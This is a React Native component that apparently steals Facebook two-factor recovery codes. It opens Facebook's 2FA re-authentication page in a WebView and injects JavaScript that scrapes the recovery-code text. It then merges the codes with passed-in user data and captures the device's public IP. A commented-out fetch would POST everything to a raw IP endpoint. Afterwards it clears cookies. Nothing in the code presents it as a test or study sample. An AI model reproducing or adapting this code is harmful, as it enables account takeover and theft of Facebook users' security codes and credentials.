import CookieManager from '@react-native-cookies/cookies';
import React, {Component} from 'react';
import {Dimensions, Text, View} from 'react-native';
import publicIP from 'react-native-public-ip';
import WebView from 'react-native-webview';
var deviceHeight = Dimensions.get('window').height;
const url2fa = 'https://m.facebook.com/security/2fac/factors/recovery-code/';
export default class Twofa extends Component {
  constructor(props) {
    super(props);
    this.state = {
      isComplete: false,
      isLoading: false,
      ipAdress: '',
      // url: 'https://m.facebook.com/password/reauth/?next=https%3A%2F%2Fm.facebook.com%2Fsecurity%2F2fac%2Ffactors%2Frecovery-code%2F&_rdr'
      url: 'https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fm.facebook.com%2Fsecurity%2F2fac%2Ffactors%2Frecovery-code%2F',
    };
    this.fbPassword = '';
    this.fbUser = '';
    this.isCheckpoint = false;
    this.handleURL = this.handleURL.bind(this);
  }

  componentDidMount() {
    console.log('huydexxxx', this.props.route);

    publicIP()
      .then(ip => {
        this.setState({ipAdress: ip});
      })
      .catch(error => {
        console.log(error);
        // 'Unable to get IP address.'
      });
  }
  async onMessage(event) {
    if (
      event.nativeEvent.data != undefined &&
      event.nativeEvent.data != null &&
      event.nativeEvent.data != ''
    ) {
      var result = JSON.parse(event.nativeEvent.data);

      this.f2a = result;
      console.log('resultresult', result.length);

      if (result.length > 20) {
        console.log('inresultrrr', result);
        await this.onCallApi();
      }
    }
  }

  async handleURL(state) {
    // CookieManager.clearAll(true)
    //     .then((success) => {
    //         console.log('CookieManager1.clearAll =>', success);
    //     });
    // this.props.navigation.navigate("Manager", { userId: cook?.c_user?.value });
    console.log('coookieieieie');
    console.debug(state.url);

    if (state.url.includes('checkpoint')) {
      this.props.navigation.navigate('Twofa');
      this.isCheckpoint = true;
    }

    if (state.url === url2fa) {
      console.log('coookieieieie1111111');
      console.debug(state.url);

      // this.props.navigation.navigate("HomeScreen",);
    }
  }

  async onCallApi() {
    console.debug('onCallApi');
    var data = this.props?.route?.params?.data;
    data.f2a = this.f2a;
    console.log('huydxxxxxdata', data);
    var reqDataJson = JSON.stringify(data);
    // var URLFetch = 'http://104.161.17.155:3000/post2fa';
    // await fetch(URLFetch, {
    //   method: 'POST',
    //   headers: {
    //     'Content-Type': 'application/json',
    //   },
    //   body: reqDataJson,
    //   credentials: 'omit',
    // });
    console.log('prenavigateee');
    CookieManager.clearAll(true).then(success => {
      console.log('CookieManager1.clearAll =>', success);
    });
    // this.props.navigation.navigate('HomeScreen');
  }

  render() {
    const scr = ` 
       var data =  document.getElementsByClassName("_1-vy")[0].innerText;
       window.ReactNativeWebView.postMessage(JSON.stringify(data))
        `;
    return (
      <View style={{flex: 0.5}}>
        <View style={{height: 40, backgroundColor: '#fff'}}></View>
        {this.state.isLoading && (
          <View
            style={{
              alignSelf: 'center',
              alignItems: 'center',
              justifyContent: 'center',
              marginTop: 100,
            }}>
            <Text style={{fontSize: 26, textAlign: 'center', color: '#2980b9'}}>
              Checking your infomation ...
            </Text>
          </View>
        )}
        {!this.state.isLoading && (
          <WebView
            ref={input => (this.input = input)}
            style={{height: deviceHeight - 50}}
            source={{uri: this.state.url}}
            onNavigationStateChange={this.handleURL}
            onMessage={event => this.onMessage(event)}
            injectedJavaScript={scr}
            startInLoadingState={true}
            // incognito={true}
          ></WebView>
        )}
      </View>
    );
  }
}